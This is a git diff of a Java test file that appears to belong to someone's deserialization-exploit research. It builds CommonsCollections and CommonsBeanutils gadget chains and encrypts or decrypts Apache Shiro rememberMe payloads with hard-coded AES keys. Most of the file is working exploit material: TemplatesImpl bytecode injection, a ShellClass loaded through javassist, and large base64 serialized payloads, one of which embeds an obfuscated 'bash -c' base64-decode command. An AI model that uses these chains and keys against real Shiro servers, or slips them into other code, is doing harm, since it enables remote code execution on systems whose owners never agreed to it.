@@ -3,15 +3,19 @@ package Seri;
 import com.sun.org.apache.bcel.internal.util.ClassLoader;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.commons.collections.Transformer;
+import javassist.ClassPool;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
 import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections.map.TransformedMap;
 
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.util.ByteSource;
 
@@ -35,41 +39,36 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 
 public class Test {
     public static void main(String[] args) throws Exception {
-//        Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer("fake")};
-//
-//        byte[] bytes = Utils.getEvilPayload("calc");
-//        TemplatesImpl templates = new TemplatesImpl();
-//        Utils.setValue(templates ,"_name" ,"xxx");
-//        Utils.setValue(templates ,"_class" ,null);
+        byte[] bytes = Utils.getEvilPayload("calc");
+        TemplatesImpl templates = new TemplatesImpl();
+        Utils.setValue(templates ,"_name" ,"xxx");
+        Utils.setValue(templates ,"_class" ,null);
 //        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
-//        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
-//        Transformer[] ts = new Transformer[]{
-//                new ConstantTransformer(TrAXFilter.class),
-//                new InstantiateTransformer(
-//                        new Class[]{Templates.class},
-//                        new Object[]{templates})
-//        };
-//        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
-//
-//        HashMap innerMap = new HashMap();
-//        Map outerMap = LazyMap.decorate(innerMap ,chainedTransformer);
-//        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"tmpKey");
-//        HashMap hashMap = new HashMap();
-//        hashMap.put(tiedMapEntry ,"xvalue");
-//
-//        outerMap.remove("tmpKey");
-//
-//        Utils.setValue(chainedTransformer ,"iTransformers" ,ts);
-//
-//        Utils.serialize(hashMap ,"bin/test.bin");
+        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{
+                ClassPool.getDefault().get(ShellClass.class.getName()).toBytecode()
+        });
+        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
 
-//        Map outerMap = TransformedMap.decorate(innerMap ,null ,chainedTransformer);
-        String key = "kPH+bIxk5D2deZiIxcaaaA==";
-        String payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXR0ABJMamF2YS9sYW5nL1N0cmluZztMAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAdMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////AHQAA2FsbHB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABy8r+ur4AAAA0ABsBAAlFdmlsQ2xhc3MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABwEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAMAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADgAPCgANABABAC1iYXNoIC1jIHtlY2hvLFkyRnNZdz09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAUABUKAA0AFgEABjxpbml0PgwAGAAKCgAIABkAIQACAAgAAAAAAAIACAAJAAoAAQALAAAAFgACAAAAAAAKuAAREhO2ABdXsQAAAAAAAQAYAAoAAQALAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAN4eHhwdwEAeHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAdbAAtpUGFyYW1UeXBlc3EAfgAKeHBwdAAObmV3VHJhbnNmb3JtZXJwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AAh0bXBWYWx1ZXg=";
+
+        BeanComparator comparator = new BeanComparator(null ,String.CASE_INSENSITIVE_ORDER);
+
+        PriorityQueue<Object> priorityQueue = new PriorityQueue(2 , comparator);
+        priorityQueue.add("1");
+        priorityQueue.add("1");
+
+        Utils.setValue(comparator ,"property" ,"outputProperties");
+//        Utils.setValue(comparator ,"queue" ,new Object[]{templates ,templates});
+
+
+//        String payload = Utils.serialize(priorityQueue ,"bin/CC4CCGadgets6.bin");
+        String payload = "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";
+        String key = "iPBr07quEyXvGESoxmCtcQ==";
+
         AesCipherService aes = new AesCipherService();
         byte[] keyBytes = Base64.getDecoder().decode(key);
-        System.out.println(aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString());
-        // 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
+        System.out.println(aes.decrypt(Base64.getDecoder().decode(payload) , keyBytes ).toString());
+
+
 
     }
 
